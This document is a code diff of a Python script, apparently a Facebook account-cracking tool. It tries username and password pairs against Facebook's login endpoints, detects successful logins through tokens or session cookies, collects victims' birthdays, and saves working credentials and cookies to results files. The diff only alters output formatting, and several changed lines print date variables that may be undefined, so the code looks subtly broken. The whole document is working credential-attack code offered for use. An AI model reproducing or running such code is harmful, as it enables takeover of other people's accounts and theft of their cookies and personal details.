@@ -510,7 +510,7 @@ class __crack__:
             api = 'https://b-api.facebook.com/method/auth.login'
             response = requests.get(api, params=params, headers=headers_)
             if re.search('(EAAA)\\w+', response.text):
-                print '\r %sID: %s|%s      %s' % (H,user,pw,N)
+                print '\r %sID: %s|%s|%s %s %s     %s' % (K,user,pw,day,month,year,N)
                 wrt = ' [✓] %s|%s' % (user,pw)
                 ok.append(wrt)
                 open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
@@ -523,7 +523,7 @@ class __crack__:
                     graph = az["birthday"]
                     month, day, year = graph.split("/")
                     month = bulan_ttl[month]
-                    print '\r  %s* --> %s|%s|%s %s %s     %s' % (K,user,pw,day,month,year,N)
+                    print '\r  %sID: %s|%s|%s %s %s     %s' % (K,user,pw,day,month,year,N)
                     wrt = ' [×] %s|%s|%s %s %s' % (user,pw,day,month,year)
                     cp.append(wrt)
                     open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
@@ -531,7 +531,7 @@ class __crack__:
                 except (KeyError, IOError):
                     tt = ' '
                 except: pass
-                print '\r %sID: %s|%s %s     %s' % (K,user,pw,tt,N)
+                print '\r %sID: %s|%s|%s %s %s     %s' % (K,user,pw,day,month,year,N)
                 wrt = ' [✓] %s|%s %s' % (user,pw,tt)
                 cp.append(wrt)
                 open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
@@ -554,7 +554,7 @@ class __crack__:
             aw = requests.post('https://mbasic.facebook.com/login.php', data={'email': user, 'pass': pw, 'login': 'submit'}, headers=headers_)
             xo = aw.content
             if 'mbasic_logout_button' in xo or 'save-device' in xo:
-                print '\r %sID: %s|%s      %s' % (H,user,pw,N)
+                print '\r %sID: %s|%s|%s %s %s     %s' % (K,user,pw,day,month,year,N)
                 wrt = ' [✓] %s|%s' % (user,pw)
                 ok.append(wrt)
                 open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
@@ -567,7 +567,7 @@ class __crack__:
                     graph = az["birthday"]
                     month, day, year = graph.split("/")
                     month = bulan_ttl[month]
-                    print '\r  %s* --> %s|%s|%s %s %s     %s' % (K,user,pw,day,month,year,N)
+                    print '\r  %sID: %s|%s|%s %s %s     %s' % (K,user,pw,day,month,year,N)
                     wrt = ' [×] %s|%s|%s %s %s' % (user,pw,day,month,year)
                     cp.append(wrt)
                     open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
@@ -575,7 +575,7 @@ class __crack__:
                 except (KeyError, IOError):
                     tt = ' '
                 except: pass
-                print '\r %sID: %s|%s %s     %s' % (K,user,pw,tt,N)
+                print '\r %sID: %s|%s|%s %s %s     %s' % (K,user,pw,day,month,year,N)
                 wrt = ' [✓] %s|%s %s' % (user,pw,tt)
                 cp.append(wrt)
                 open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
@@ -601,7 +601,7 @@ class __crack__:
             b = ses.post('https://m.facebook.com/login', data={'email': user, 'pass': pw}).url
             if 'c_user' in ses.cookies.get_dict().keys():
                 kuki = (';').join([ '%s=%s' % (key, value) for key, value in ses.cookies.get_dict().items() ])
-                print '\r %sID: %s|%s %s     %s' % (H,user,pw,kuki,N)
+                print '\r %sID: %s|%s|%s %s %s     %s' % (K,user,pw,day,month,year,N)
                 wrt = ' [✓] %s|%s|%s' % (user, pw, kuki)
                 ok.append(wrt)
                 open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
@@ -614,7 +614,7 @@ class __crack__:
                     graph = az["birthday"]
                     month, day, year = graph.split("/")
                     month = bulan_ttl[month]
-                    print '\r  %s* --> %s|%s|%s %s %s     %s' % (K,user,pw,day,month,year,N)
+                    print '\r  %sID: %s|%s|%s %s %s     %s' % (K,user,pw,day,month,year,N)
                     wrt = ' [×] %s|%s|%s %s %s' % (user,pw,day,month,year)
                     cp.append(wrt)
                     open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
@@ -622,7 +622,7 @@ class __crack__:
                 except (KeyError, IOError):
                     tt = ' '
                 except: pass
-                print '\r %sID: %s|%s %s     %s' % (K,user,pw,tt,N)
+                print '\r %sID: %s|%s|%s %s %s     %s' % (K,user,pw,day,month,year,N)
                 wrt = ' [✓] %s|%s %s' % (user,pw,tt)
                 cp.append(wrt)
                 open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
